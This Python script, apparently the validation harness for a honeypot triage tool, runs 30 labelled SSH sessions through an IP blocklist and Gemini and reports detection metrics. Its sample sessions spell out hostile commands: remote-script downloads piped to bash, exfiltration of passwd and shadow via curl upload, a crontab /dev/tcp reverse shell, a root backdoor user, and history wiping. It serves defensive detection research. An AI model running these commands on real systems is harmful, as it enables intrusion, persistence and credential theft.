import json
from triagem import carregar_chave_api, carregar_lista_ipsum, filtrar_ruido_l1, analisar_com_gemini

AMOSTRA_VALIDACAO = [
    {"session_id": "bot_01", "src_ip": "185.220.101.42", "usuario": "root", "senha": "123", "duracao": 1.1, "comandos": ["uname -s -v -n -r -m"], "esperado": "BOT_AUTOMATIZADO"},
    {"session_id": "bot_02", "src_ip": "77.239.124.147", "usuario": "root", "senha": "123456", "duracao": 1.0, "comandos": ["uname -s -v -n -r -m"], "esperado": "BOT_AUTOMATIZADO"},
    {"session_id": "bot_03", "src_ip": "109.160.32.178", "usuario": "gpadmin", "senha": "gpadmin", "duracao": 0.9, "comandos": ["uname -s -v -n -r -m"], "esperado": "BOT_AUTOMATIZADO"},
    {"session_id": "bot_04", "src_ip": "27.102.116.43", "usuario": "root", "senha": "admin", "duracao": 0.8, "comandos": ["echo xsec"], "esperado": "BOT_AUTOMATIZADO"},
    {"session_id": "bot_05", "src_ip": "154.18.197.29", "usuario": "admin", "senha": "admin", "duracao": 1.2, "comandos": ["echo xsec"], "esperado": "BOT_AUTOMATIZADO"},
    {"session_id": "bot_06", "src_ip": "45.142.214.18", "usuario": "user", "senha": "user", "duracao": 1.5, "comandos": ["curl -sL http://pool.minexmr.com/install.sh | bash"], "esperado": "BOT_AUTOMATIZADO"},
    {"session_id": "bot_07", "src_ip": "185.220.101.42", "usuario": "root", "senha": "123", "duracao": 1.4, "comandos": ["cd /tmp; wget http://185.220.101.42/bot.sh; chmod +x bot.sh; ./bot.sh"], "esperado": "BOT_AUTOMATIZADO"},
    {"session_id": "bot_08", "src_ip": "91.240.118.172", "usuario": "root", "senha": "root", "duracao": 1.0, "comandos": ["cat /proc/cpuinfo"], "esperado": "BOT_AUTOMATIZADO"},
    {"session_id": "bot_09", "src_ip": "193.32.162.159", "usuario": "root", "senha": "1234", "duracao": 0.7, "comandos": ["uname -a"], "esperado": "BOT_AUTOMATIZADO"},
    {"session_id": "bot_10", "src_ip": "89.248.165.58", "usuario": "admin", "senha": "1234", "duracao": 0.9, "comandos": ["uname -s -v -n -r -m"], "esperado": "BOT_AUTOMATIZADO"},
    {"session_id": "bot_11", "src_ip": "45.155.205.233", "usuario": "root", "senha": "password", "duracao": 1.1, "comandos": ["uname -s -v -n -r -m"], "esperado": "BOT_AUTOMATIZADO"},
    {"session_id": "bot_12", "src_ip": "194.26.29.114", "usuario": "root", "senha": "12345", "duracao": 0.8, "comandos": ["echo xsec"], "esperado": "BOT_AUTOMATIZADO"},
    {"session_id": "bot_13", "src_ip": "185.156.73.54", "usuario": "ubuntu", "senha": "ubuntu", "duracao": 1.0, "comandos": ["uname -s -v -n -r -m"], "esperado": "BOT_AUTOMATIZADO"},
    {"session_id": "bot_14", "src_ip": "5.188.206.14", "usuario": "root", "senha": "toor", "duracao": 0.9, "comandos": ["cat /proc/cpuinfo"], "esperado": "BOT_AUTOMATIZADO"},
    {"session_id": "bot_15", "src_ip": "141.98.11.45", "usuario": "root", "senha": "123456", "duracao": 1.1, "comandos": ["uname -s -v -n -r -m"], "esperado": "BOT_AUTOMATIZADO"},
    {"session_id": "bot_16", "src_ip": "179.43.176.50", "usuario": "root", "senha": "admin123", "duracao": 1.0, "comandos": ["uname -a"], "esperado": "BOT_AUTOMATIZADO"},
    {"session_id": "bot_17", "src_ip": "185.220.101.7", "usuario": "root", "senha": "123", "duracao": 0.9, "comandos": ["uname -s -v -n -r -m"], "esperado": "BOT_AUTOMATIZADO"},
    {"session_id": "bot_18", "src_ip": "92.118.39.62", "usuario": "test", "senha": "test", "duracao": 0.8, "comandos": ["echo xsec"], "esperado": "BOT_AUTOMATIZADO"},
    {"session_id": "bot_19", "src_ip": "195.54.160.149", "usuario": "root", "senha": "qwerty", "duracao": 1.0, "comandos": ["uname -s -v -n -r -m"], "esperado": "BOT_AUTOMATIZADO"},
    {"session_id": "bot_20", "src_ip": "198.51.100.200", "usuario": "root", "senha": "123456", "duracao": 18.0, "comandos": ["id", "uname -a", "cat /etc/issue", "ls -la /tmp", "crontab -l", "wget http://203.0.113.88/check.sh"], "esperado": "BOT_AUTOMATIZADO"},
    {"session_id": "hum_01", "src_ip": "189.109.21.199", "usuario": "root", "senha": "kjsdoaiksdasd", "duracao": 29.0, "comandos": ["ls", "mkdir teste123", "cd ..", "ls", "cd usr/", "exit"], "esperado": "ATAQUE_HUMANO_DIRECIONADO"},
    {"session_id": "hum_02", "src_ip": "189.109.21.199", "usuario": "root", "senha": "Senha@123", "duracao": 221.4, "comandos": ["ls -a", "cd .bashrc", "ipconfig"], "esperado": "ATAQUE_HUMANO_DIRECIONADO"},
    {"session_id": "hum_03", "src_ip": "172.19.0.1", "usuario": "root", "senha": "Fatec@2026!", "duracao": 50.0, "comandos": ["whoami", "uname -a", "ls -la", "cat /etc/passwd | grep sh", "cat /etc/shadow", "find / -perm -4000 2>/dev/null", "mkdir -p ~/.ssh && echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFatecTCC2026 redteam@kali' >> ~/.ssh/authorized_keys", "history -c", "exit"], "esperado": "ATAQUE_HUMANO_DIRECIONADO"},
    {"session_id": "hum_04", "src_ip": "172.19.0.1", "usuario": "admin", "senha": "Admin@2026", "duracao": 38.0, "comandos": ["id", "pwd", "ls -la /var/www", "find / -name '*.env' -o -name 'wp-config.php' 2>/dev/null", "ps aux | grep -E 'mysql|postgres|nginx|apache'", "tar -czf /tmp/backup_dump.tar.gz /etc/passwd /etc/shadow", "curl -F 'file=@/tmp/backup_dump.tar.gz' http://198.51.100.99/upload", "rm -f /tmp/backup_dump.tar.gz && history -c", "exit"], "esperado": "ATAQUE_HUMANO_DIRECIONADO"},
    {"session_id": "hum_05", "src_ip": "172.19.0.1", "usuario": "root", "senha": "Root#Fatec26", "duracao": 30.0, "comandos": ["whoami && hostname", "ip a", "netstat -tulpn", "cat ~/.ssh/id_rsa", "crontab -l", "echo '*/10 * * * * /bin/bash -c \"bash -i >& /dev/tcp/203.0.113.55/4443 0>&1\"' >> /etc/crontab", "unset HISTFILE && exit"], "esperado": "ATAQUE_HUMANO_DIRECIONADO"},
    {"session_id": "hum_06", "src_ip": "198.51.100.77", "usuario": "admin_ti", "senha": "Fatec@2026!", "duracao": 65.0, "comandos": ["whoami", "id", "ls -la /var/www/", "cd /var/www/html && ls -la", "cat /etc/os-release", "find / -perm -4000 2>/dev/null", "cat ~/.ssh/id_rsa", "netstat -tulpn"], "esperado": "ATAQUE_HUMANO_DIRECIONADO"},
    {"session_id": "hum_07", "src_ip": "203.0.113.19", "usuario": "sysadmin", "senha": "Password123!", "duracao": 47.0, "comandos": ["whoami", "sudo -l", "cat /etc/passwd", "echo 'backdoor:x:0:0:root:/root:/bin/bash' >> /etc/passwd", "crontab -l", "cat /var/log/auth.log | tail -n 20", "history -c && rm -f ~/.bash_history"], "esperado": "ATAQUE_HUMANO_DIRECIONADO"},
    {"session_id": "hum_08", "src_ip": "198.51.100.81", "usuario": "root", "senha": "root123", "duracao": 42.0, "comandos": ["pwd", "ls -la /home", "cat /etc/group", "ss -tulnp", "find /etc -writable 2>/dev/null", "history -c"], "esperado": "ATAQUE_HUMANO_DIRECIONADO"},
    {"session_id": "hum_09", "src_ip": "198.51.100.82", "usuario": "root", "senha": "admin123", "duracao": 54.0, "comandos": ["whoami", "cat /etc/hosts", "arp -a", "cat ~/.bash_history", "grep -rn 'password' /var/www/ 2>/dev/null", "exit"], "esperado": "ATAQUE_HUMANO_DIRECIONADO"},
    {"session_id": "hum_10", "src_ip": "198.51.100.83", "usuario": "root", "senha": "123456", "duracao": 39.0, "comandos": ["id", "uname -r", "ls -la /root", "cat /etc/sudoers", "useradd -m -s /bin/bash suporte", "history -c && exit"], "esperado": "ATAQUE_HUMANO_DIRECIONADO"}
]


def main():
    chave_api = carregar_chave_api()
    ips_ipsum = carregar_lista_ipsum()

    vp = vn = fp = fn = 0
    tempos_api = []

    print(f"Iniciando validacao com {len(AMOSTRA_VALIDACAO)} sessoes rotuladas...\n")

    for item in AMOSTRA_VALIDACAO:
        laudo = filtrar_ruido_l1(item, ips_ipsum)
        if not laudo:
            laudo = analisar_com_gemini(item, chave_api)
            tempos_api.append(laudo["tempo_segundos"])
            
        previsto = laudo.get("actor_type", "BOT_AUTOMATIZADO")
        esperado = item["esperado"]

        if esperado == "ATAQUE_HUMANO_DIRECIONADO" and previsto == "ATAQUE_HUMANO_DIRECIONADO":
            vp += 1
        elif esperado == "BOT_AUTOMATIZADO" and previsto == "BOT_AUTOMATIZADO":
            vn += 1
        elif esperado == "BOT_AUTOMATIZADO" and previsto == "ATAQUE_HUMANO_DIRECIONADO":
            fp += 1
        else:
            fn += 1

        status = "OK" if previsto == esperado else "ERRO"
        print(f"[{status}] {item['session_id']}: Esperado={esperado} | Previsto={previsto}")

    total = vp + vn + fp + fn
    acuracia = ((vp + vn) / total) * 100
    precisao = (vp / (vp + fp)) * 100 if (vp + fp) else 0.0
    recall = (vp / (vp + fn)) * 100 if (vp + fn) else 0.0
    f1 = (2 * precisao * recall / (precisao + recall)) if (precisao + recall) else 0.0
    tempo_medio = sum(tempos_api) / len(tempos_api) if tempos_api else 0.0

    print("\n=== RESULTADO DA MATRIZ DE CONFUSAO (N = 30) ===")
    print(f"Verdadeiros Positivos (VP): {vp}")
    print(f"Verdadeiros Negativos (VN): {vn}")
    print(f"Falsos Positivos (FP):      {fp}")
    print(f"Falsos Negativos (FN):      {fn}")
    print(f"Acuracia:                   {acuracia:.1f}%")
    print(f"Precisao:                   {precisao:.1f}%")
    print(f"Recall (Sensibilidade):     {recall:.1f}%")
    print(f"F1-Score:                   {f1:.1f}%")
    print(f"Tempo medio na API Gemini:  {tempo_medio:.2f}s")


if __name__ == "__main__":
    main()
